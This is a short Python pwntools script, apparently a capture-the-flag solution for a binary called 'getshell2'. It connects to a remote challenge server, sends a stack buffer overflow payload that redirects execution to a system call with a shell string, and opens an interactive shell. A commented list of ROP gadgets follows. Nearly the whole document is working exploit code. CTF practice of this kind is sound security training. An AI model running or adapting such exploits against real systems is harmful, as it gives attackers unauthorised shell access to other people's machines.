from pwn import *
context(log_level='debug',os='linux',arch='amd64',terminal=['tmux','splitw','-h'])

# io=process("./getshell2")
elf=ELF("./getshell2")
io=remote("1.14.71.254",28737)

call_sys=0x8048529
sh_addr=0x8048670

io.recvuntil(b"\n")
payload=cyclic(0x1c)+p32(call_sys)+p32(sh_addr)
io.sendline(payload)
io.interactive()

# Gadgets information
# ============================================================
# 0x0804862b : pop ebp ; ret
# 0x08048628 : pop ebx ; pop esi ; pop edi ; pop ebp ; ret
# 0x08048399 : pop ebx ; ret
# 0x0804862a : pop edi ; pop ebp ; ret
# 0x08048629 : pop esi ; pop edi ; pop ebp ; ret
# 0x08048382 : ret
# 0x0804849e : ret 0xeac1
# 0x080487dc : ret 0xfffd

# Unique gadgets found: 8